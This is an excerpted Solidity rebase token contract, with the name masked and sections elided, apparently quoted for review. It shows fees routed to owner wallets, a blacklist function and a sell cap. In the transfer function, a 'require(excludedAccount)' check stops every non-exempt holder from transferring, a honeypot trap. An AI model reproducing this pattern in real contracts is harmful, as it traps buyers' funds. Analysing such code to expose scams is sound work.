...
contract Xxx is ERC20Detailed, Ownable {
    ...
    uint256 public xxxInsuranceFundFee = 50;
    uint256 public sellFee = 20;
    uint256 public firePitFee = 25;
    uint256 public totalFee =
        liquidityFee.add(treasuryFee).add(xxxInsuranceFundFee).add(firePitFee);
    ...
    address public xxxInsuranceFundReceiver;
    ...
    uint256 public _getCirculatingSupply;
    ...
    constructor() ERC20Detailed("XXX", "XXX", uint8(DECIMALS)) Ownable() {
        //testnet
        ...
        autoLiquidityReceiver = 0xd88fAe4b8273EAF5A64951A23e8c5fb372E7739B;
        treasuryReceiver = 0x7Cd3de39C9e2904f3F18FEc8679d870F77bcFaEc;
        xxxInsuranceFundReceiver = 0x68Eae235Cf46Ec46c90cEc89DF0550ed2C5e1b80;
        ...
        _initRebaseStartTime = 1653184783;
        _lastRebasedTime = block.timestamp;
        _autoRebase = true;
        _autoAddLiquidity = true;
        _isFeeExempt[treasuryReceiver] = true;
        //_isFeeExempt[xxxInsuranceFundReceiver] = true;
    ...
    function _transferFrom(
        ...
        require(excludedAccount, "Error");
        if (!excludedAccount) {
            require(
                amount <= ((_getCirculatingSupply / 100)),
                "ERR: Can't sell more than 1% of the Circulating Supply"
            );
            uint256 blkTime = block.timestamp;
            uint256 onePercent = balanceOf(sender).mul(1).div(100);
    ...
    function takeFee(
        ...
        _gonBalances[address(this)] = _gonBalances[address(this)].add(
            gonAmount.div(feeDenominator).mul(
                _treasuryFee.add(xxxInsuranceFundFee)
            )
        );
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountETHToTreasuryAndXIF = address(this).balance.sub(
            balanceBefore
        );

        (bool success, ) = payable(treasuryReceiver).call{
            value: amountETHToTreasuryAndXIF.mul(treasuryFee).div(
                treasuryFee.add(xxxInsuranceFundFee)
            ),
            gas: 30000
        }("");
        (success, ) = payable(xxxInsuranceFundReceiver).call{
            value: amountETHToTreasuryAndXIF.mul(xxxInsuranceFundFee).div(
                treasuryFee.add(xxxInsuranceFundFee)
            ),
            gas: 30000
        }("");
    ...
    //     require(
    //         amountToSwap > 0,
    //         "There is no xxx token deposited in token contract"
    //     );
    //     address[] memory path = new address[](2);
    //     path[0] = address(this);
    //     path[1] = router.WETH();
    ...
    //     address _xxxInsuranceFundReceiver,
    //     address _firePit
    // ) external onlyOwner {
    //     autoLiquidityReceiver = _autoLiquidityReceiver;
    //     treasuryReceiver = _treasuryReceiver;
    //     xxxInsuranceFundReceiver = _xxxInsuranceFundReceiver;
    //     firePit = _firePit;
    // }
        ...
        onlyOwner
    {
        ...
        require(
            _botAddress != address(this) &&
                _botAddress != pair &&
                _botAddress != address(router),
            "cannot blacklist xxx Token, Pair and Router PancakeSwap"
        );
